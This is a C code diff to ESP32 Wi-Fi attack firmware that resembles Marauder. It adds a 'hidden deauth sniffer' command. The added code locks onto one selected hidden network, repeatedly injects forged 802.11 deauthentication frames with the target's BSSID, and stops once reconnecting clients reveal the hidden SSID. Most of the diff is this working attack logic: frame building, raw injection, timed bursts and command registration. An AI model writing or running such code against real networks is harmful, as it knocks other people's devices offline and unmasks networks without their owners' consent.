@@ -321,12 +321,19 @@ static int sniffer_current_channel = 1;
 static int sniffer_channel_index = 0;
 static int64_t sniffer_last_channel_hop = 0;
 static const int sniffer_channel_hop_delay_ms = 250; // 250ms per channel like Marauder
+static const int sniffer_hidden_deauth_interval_ms = 5000;
+static const int sniffer_hidden_deauth_burst_count = 3;
+static const int sniffer_hidden_deauth_burst_gap_ms = 60;
 // Sniffer OLED shared state (callback -> task)
 static volatile uint32_t sniff_oled_packets = 0;
 static volatile bool sniff_oled_dirty = false;
 static TaskHandle_t sniffer_channel_task_handle = NULL;
+static TaskHandle_t sniffer_hidden_deauth_task_handle = NULL;
 static uint32_t sniffer_packet_counter = 0;
 static uint32_t sniffer_last_debug_packet = 0;
+static volatile bool sniffer_hidden_deauth_mode = false;
+static uint8_t sniffer_hidden_deauth_target_bssid[6] = {0};
+static uint8_t sniffer_hidden_deauth_target_channel = 0;
 
 // PCAP capture state
 typedef enum {
@@ -1322,6 +1329,7 @@ static int cmd_start_wardrive(int argc, char **argv);
 static int cmd_start_sniffer(int argc, char **argv);
 static int cmd_start_sniffer_noscan(int argc, char **argv);
 static int cmd_start_sniffer_noscan_hidden(int argc, char **argv);
+static int cmd_start_sniffer_noscan_hidden_deauth(int argc, char **argv);
 static int cmd_packet_monitor(int argc, char **argv);
 static int cmd_channel_view(int argc, char **argv);
 static int cmd_show_sniffer_results(int argc, char **argv);
@@ -1384,6 +1392,11 @@ static bool sniffer_learn_hidden_ssid(const uint8_t *bssid, const char *ssid, co
 static bool parse_ssid_tag(const uint8_t *ies, int ies_len, char *ssid_out, size_t out_size);
 static void sniffer_try_learn_hidden_ssid_from_mgmt(const uint8_t *frame, int len, uint8_t frame_type);
 static void sniffer_build_hidden_channel_list_from_scan_results(void);
+static void stop_sniffer_capture_preserve_data(const char *message);
+static void sniffer_hidden_deauth_reset_state(void);
+static bool sniffer_hidden_deauth_get_learned_ssid(char *ssid_out, size_t ssid_out_size);
+static void sniffer_hidden_deauth_send_burst(void);
+static void sniffer_hidden_deauth_task(void *pvParameters);
 static void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count);
 // Target BSSID management functions
 static void save_target_bssids(void);
@@ -3495,6 +3508,123 @@ static void sniffer_try_learn_hidden_ssid_from_mgmt(const uint8_t *frame, int le
     if (parse_ssid_tag(ies, ies_len, ssid, sizeof(ssid))) {
         sniffer_learn_hidden_ssid(bssid, ssid, source);
     }
+}
+
+static void stop_sniffer_capture_preserve_data(const char *message) {
+    sniffer_active = false;
+    sniffer_scan_phase = false;
+    esp_wifi_set_promiscuous(false);
+
+    if (sniffer_channel_task_handle != NULL) {
+        vTaskDelete(sniffer_channel_task_handle);
+        sniffer_channel_task_handle = NULL;
+        MY_LOG_INFO(TAG, "Stopped sniffer channel hopping task");
+    }
+
+    sniffer_channel_index = 0;
+    sniffer_current_channel = dual_band_channels[0];
+    sniffer_last_channel_hop = 0;
+    sniffer_selected_mode = false;
+    sniffer_channel_list_active = false;
+    sniffer_selected_channels_count = 0;
+    memset(sniffer_selected_channels, 0, sizeof(sniffer_selected_channels));
+
+    if (message && message[0] != '\0') {
+        MY_LOG_INFO(TAG, "%s", message);
+    }
+}
+
+static void sniffer_hidden_deauth_reset_state(void) {
+    sniffer_hidden_deauth_mode = false;
+    memset(sniffer_hidden_deauth_target_bssid, 0, sizeof(sniffer_hidden_deauth_target_bssid));
+    sniffer_hidden_deauth_target_channel = 0;
+    target_bssid_count = 0;
+    if (target_bssids != NULL) {
+        memset(target_bssids, 0, MAX_TARGET_BSSIDS * sizeof(target_bssid_t));
+    }
+}
+
+static bool sniffer_hidden_deauth_get_learned_ssid(char *ssid_out, size_t ssid_out_size) {
+    if (!ssid_out || ssid_out_size == 0) {
+        return false;
+    }
+
+    ssid_out[0] = '\0';
+    return copy_effective_ssid_by_bssid(sniffer_hidden_deauth_target_bssid, ssid_out, ssid_out_size);
+}
+
+static void sniffer_hidden_deauth_send_burst(void) {
+    if (!sniffer_hidden_deauth_mode || !sniffer_active || operation_stop_requested ||
+        sniffer_hidden_deauth_target_channel == 0) {
+        return;
+    }
+
+    esp_wifi_set_channel(sniffer_hidden_deauth_target_channel, WIFI_SECOND_CHAN_NONE);
+    sniffer_current_channel = sniffer_hidden_deauth_target_channel;
+    sniffer_last_channel_hop = esp_timer_get_time() / 1000;
+
+    for (int i = 0; i < sniffer_hidden_deauth_burst_count; i++) {
+        if (!sniffer_hidden_deauth_mode || !sniffer_active || operation_stop_requested) {
+            break;
+        }
+
+        uint8_t deauth_frame[sizeof(deauth_frame_default)];
+        memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+        memcpy(&deauth_frame[10], sniffer_hidden_deauth_target_bssid, 6);
+        memcpy(&deauth_frame[16], sniffer_hidden_deauth_target_bssid, 6);
+        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+
+        if (i + 1 < sniffer_hidden_deauth_burst_count) {
+            vTaskDelay(pdMS_TO_TICKS(sniffer_hidden_deauth_burst_gap_ms));
+        }
+    }
+}
+
+static void sniffer_hidden_deauth_task(void *pvParameters) {
+    (void)pvParameters;
+
+    MY_LOG_INFO(TAG,
+                "Hidden deauth sniffer task started for BSSID %02X:%02X:%02X:%02X:%02X:%02X on channel %d",
+                sniffer_hidden_deauth_target_bssid[0], sniffer_hidden_deauth_target_bssid[1],
+                sniffer_hidden_deauth_target_bssid[2], sniffer_hidden_deauth_target_bssid[3],
+                sniffer_hidden_deauth_target_bssid[4], sniffer_hidden_deauth_target_bssid[5],
+                sniffer_hidden_deauth_target_channel);
+
+    int64_t last_deauth_us = 0;
+
+    while (sniffer_active && sniffer_hidden_deauth_mode && !operation_stop_requested) {
+        char learned_ssid[33];
+        if (sniffer_hidden_deauth_get_learned_ssid(learned_ssid, sizeof(learned_ssid))) {
+            MY_LOG_INFO(TAG,
+                        "Resolved hidden SSID '%s' for BSSID %02X:%02X:%02X:%02X:%02X:%02X. Auto-stopping hidden deauth sniffer.",
+                        learned_ssid,
+                        sniffer_hidden_deauth_target_bssid[0], sniffer_hidden_deauth_target_bssid[1],
+                        sniffer_hidden_deauth_target_bssid[2], sniffer_hidden_deauth_target_bssid[3],
+                        sniffer_hidden_deauth_target_bssid[4], sniffer_hidden_deauth_target_bssid[5]);
+            stop_sniffer_capture_preserve_data("Sniffer stopped. Data preserved - use 'show_scan_results_hidden' to view.");
+            esp_err_t led_err = led_set_idle();
+            if (led_err != ESP_OK) {
+                ESP_LOGW(TAG, "Failed to restore idle LED after hidden deauth sniffer: %s", esp_err_to_name(led_err));
+            }
+            sniffer_hidden_deauth_reset_state();
+            sniffer_hidden_deauth_task_handle = NULL;
+            vTaskDelete(NULL);
+            return;
+        }
+
+        int64_t now_us = esp_timer_get_time();
+        if (now_us - last_deauth_us >= (int64_t)sniffer_hidden_deauth_interval_ms * 1000) {
+            sniffer_hidden_deauth_send_burst();
+            last_deauth_us = now_us;
+        }
+
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+
+    sniffer_hidden_deauth_reset_state();
+    sniffer_hidden_deauth_task_handle = NULL;
+    MY_LOG_INFO(TAG, "Hidden deauth sniffer task finished.");
+    vTaskDelete(NULL);
 }
 
 const char* authmode_to_string(wifi_auth_mode_t mode) {
@@ -8338,33 +8468,32 @@ static int cmd_stop(int argc, char **argv) {
         g_scan_in_progress = false;
         MY_LOG_INFO(TAG, "Background scan stopped.");
     }
+
+    bool hidden_deauth_was_active = (sniffer_hidden_deauth_mode || sniffer_hidden_deauth_task_handle != NULL);
+    if (hidden_deauth_was_active) {
+        MY_LOG_INFO(TAG, "Stopping hidden deauth sniffer task...");
+        sniffer_hidden_deauth_mode = false;
+    }
     
     // Stop sniffer if active (keep collected data)
     if (sniffer_active) {
-        sniffer_active = false;
-        sniffer_scan_phase = false;
-        esp_wifi_set_promiscuous(false);
-        
-        // Stop channel hopping task
-        if (sniffer_channel_task_handle != NULL) {
-            vTaskDelete(sniffer_channel_task_handle);
-            sniffer_channel_task_handle = NULL;
-            MY_LOG_INFO(TAG, "Stopped sniffer channel hopping task");
+        stop_sniffer_capture_preserve_data("Sniffer stopped. Data preserved - use 'show_sniffer_results' to view.");
+    }
+
+    if (sniffer_hidden_deauth_task_handle != NULL) {
+        for (int i = 0; i < 20 && sniffer_hidden_deauth_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
         }
-        
-        // Reset channel state for next session
-        sniffer_channel_index = 0;
-        sniffer_current_channel = dual_band_channels[0];
-        sniffer_last_channel_hop = 0;
-        
-        // Reset selected networks mode state
-        sniffer_selected_mode = false;
-        sniffer_channel_list_active = false;
-        sniffer_selected_channels_count = 0;
-        memset(sniffer_selected_channels, 0, sizeof(sniffer_selected_channels));
-        
-        // Note: sniffer_aps and sniffer_ap_count are preserved for show_sniffer_results
-        MY_LOG_INFO(TAG, "Sniffer stopped. Data preserved - use 'show_sniffer_results' to view.");
+
+        if (sniffer_hidden_deauth_task_handle != NULL) {
+            vTaskDelete(sniffer_hidden_deauth_task_handle);
+            sniffer_hidden_deauth_task_handle = NULL;
+            MY_LOG_INFO(TAG, "Hidden deauth sniffer task forcefully stopped.");
+        }
+
+        sniffer_hidden_deauth_reset_state();
+    } else if (hidden_deauth_was_active) {
+        sniffer_hidden_deauth_reset_state();
     }
     
     // Stop sniffer_dog if active
@@ -10687,6 +10816,138 @@ static int cmd_start_sniffer_noscan_hidden(int argc, char **argv) {
     }
     MY_LOG_INFO(TAG, "Use 'show_scan_results_hidden' to check learned SSIDs or 'stop' to stop.");
     
+    return 0;
+}
+
+static int cmd_start_sniffer_noscan_hidden_deauth(int argc, char **argv) {
+    (void)argc; (void)argv;
+
+    {
+        char oled_l3[32];
+        snprintf(oled_l3, sizeof(oled_l3), "  %u networks", g_scan_count);
+        oled_display_update_full("> Hidden Deauth", "  Selected target", oled_l3, "  Capturing...");
+    }
+    log_memory_info("start_sniffer_noscan_hidden_deauth");
+
+    if (!ensure_wifi_mode()) {
+        return 1;
+    }
+
+    operation_stop_requested = false;
+
+    if (sniffer_active || sniffer_hidden_deauth_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Sniffer already active. Use 'stop' to stop it first.");
+        return 1;
+    }
+
+    if (!g_scan_done || g_scan_count == 0) {
+        MY_LOG_INFO(TAG, "Please scan_networks_hidden first.");
+        return 1;
+    }
+
+    if (g_selected_count != 1) {
+        MY_LOG_INFO(TAG, "Select exactly 1 hidden network first with 'select_networks <index>'.");
+        return 1;
+    }
+
+    int idx = g_selected_indices[0];
+    if (idx < 0 || idx >= (int)g_scan_count) {
+        MY_LOG_INFO(TAG, "Selected network index is out of range. Run scan_networks_hidden and select again.");
+        return 1;
+    }
+
+    wifi_ap_record_t *selected_ap = &g_scan_results[idx];
+    if (!scan_record_ssid_is_hidden(selected_ap)) {
+        MY_LOG_INFO(TAG, "Selected network already has a visible SSID. Use start_sniffer_noscan_hidden for passive capture.");
+        return 1;
+    }
+
+    char known_ssid[33];
+    if (copy_effective_scan_ssid(selected_ap, known_ssid, sizeof(known_ssid))) {
+        MY_LOG_INFO(TAG, "Hidden SSID is already known for this BSSID: %s_hidden_ssid", known_ssid);
+        return 0;
+    }
+
+    if (!ensure_ap_mode()) {
+        MY_LOG_INFO(TAG, "Failed to enable AP mode required for deauth injection.");
+        return 1;
+    }
+
+    sniffer_hidden_deauth_reset_state();
+
+    MY_LOG_INFO(TAG, "Starting hidden deauth sniffer for selected target only...");
+
+    sniffer_active = true;
+    sniffer_scan_phase = false;
+    sniffer_selected_mode = true;
+    sniffer_hidden_deauth_mode = true;
+
+    sniffer_init_selected_networks();
+
+    if (sniffer_ap_count == 0 || sniffer_selected_channels_count == 0) {
+        MY_LOG_INFO(TAG, "Failed to initialize selected hidden target for sniffer");
+        sniffer_active = false;
+        sniffer_selected_mode = false;
+        sniffer_hidden_deauth_mode = false;
+        sniffer_channel_list_active = false;
+        return 1;
+    }
+
+    save_target_bssids();
+    if (target_bssid_count != 1) {
+        MY_LOG_INFO(TAG, "Failed to prepare exactly one hidden target for deauth.");
+        sniffer_active = false;
+        sniffer_selected_mode = false;
+        sniffer_hidden_deauth_mode = false;
+        sniffer_channel_list_active = false;
+        sniffer_hidden_deauth_reset_state();
+        return 1;
+    }
+
+    memcpy(sniffer_hidden_deauth_target_bssid, selected_ap->bssid, sizeof(sniffer_hidden_deauth_target_bssid));
+    sniffer_hidden_deauth_target_channel = selected_ap->primary;
+
+    esp_wifi_set_promiscuous_filter(&sniffer_filter);
+    esp_wifi_set_promiscuous_rx_cb(sniffer_promiscuous_callback);
+    esp_wifi_set_promiscuous(true);
+
+    sniffer_channel_index = 0;
+    sniffer_current_channel = sniffer_hidden_deauth_target_channel;
+    sniffer_last_channel_hop = esp_timer_get_time() / 1000;
+    esp_wifi_set_channel(sniffer_current_channel, WIFI_SECOND_CHAN_NONE);
+
+    if (sniffer_channel_task_handle == NULL) {
+        xTaskCreate(sniffer_channel_task, "sniffer_channel", 2048, NULL, 5, &sniffer_channel_task_handle);
+        MY_LOG_INFO(TAG, "Started sniffer channel hopping task");
+    }
+
+    if (sniffer_hidden_deauth_task_handle == NULL) {
+        if (xTaskCreate(sniffer_hidden_deauth_task,
+                        "hidden_deauth",
+                        3072,
+                        NULL,
+                        5,
+                        &sniffer_hidden_deauth_task_handle) != pdPASS) {
+            MY_LOG_INFO(TAG, "Failed to start hidden deauth sniffer task.");
+            stop_sniffer_capture_preserve_data(NULL);
+            sniffer_hidden_deauth_reset_state();
+            return 1;
+        }
+    }
+
+    esp_err_t led_err = led_set_color(0, 255, 0);
+    if (led_err != ESP_OK) {
+        ESP_LOGW(TAG, "Failed to set LED for hidden deauth sniffer: %s", esp_err_to_name(led_err));
+    }
+
+    MY_LOG_INFO(TAG,
+                "Hidden deauth sniffer: locked to selected BSSID %02X:%02X:%02X:%02X:%02X:%02X on channel %d",
+                selected_ap->bssid[0], selected_ap->bssid[1], selected_ap->bssid[2],
+                selected_ap->bssid[3], selected_ap->bssid[4], selected_ap->bssid[5],
+                selected_ap->primary);
+    MY_LOG_INFO(TAG, "Sending periodic deauth bursts until the hidden SSID is learned.");
+    MY_LOG_INFO(TAG, "Use 'show_scan_results_hidden' to view learned SSID or 'stop' to stop early.");
+
     return 0;
 }
 
@@ -15475,6 +15736,15 @@ static void register_commands(void)
     };
     ESP_ERROR_CHECK(esp_console_cmd_register(&sniffer_noscan_hidden_cmd));
 
+    const esp_console_cmd_t sniffer_noscan_hidden_deauth_cmd = {
+        .command = "start_sniffer_noscan_hidden_deauth",
+        .help = "Starts hidden-SSID sniffer for exactly one selected hidden network and sends periodic deauth bursts until SSID is learned",
+        .hint = NULL,
+        .func = &cmd_start_sniffer_noscan_hidden_deauth,
+        .argtable = NULL
+    };
+    ESP_ERROR_CHECK(esp_console_cmd_register(&sniffer_noscan_hidden_deauth_cmd));
+
     const esp_console_cmd_t packet_monitor_cmd = {
         .command = "packet_monitor",
         .help = "Monitor packets per second on a channel: packet_monitor <channel>",
@@ -16384,6 +16654,7 @@ void app_main(void) {
       MY_LOG_INFO(TAG,"  start_sniffer_dog");
       MY_LOG_INFO(TAG,"  start_sniffer_noscan");
       MY_LOG_INFO(TAG,"  start_sniffer_noscan_hidden");
+      MY_LOG_INFO(TAG,"  start_sniffer_noscan_hidden_deauth");
       MY_LOG_INFO(TAG,"  start_wardrive");
       MY_LOG_INFO(TAG,"  start_wardrive_promisc");
       MY_LOG_INFO(TAG,"  stop");
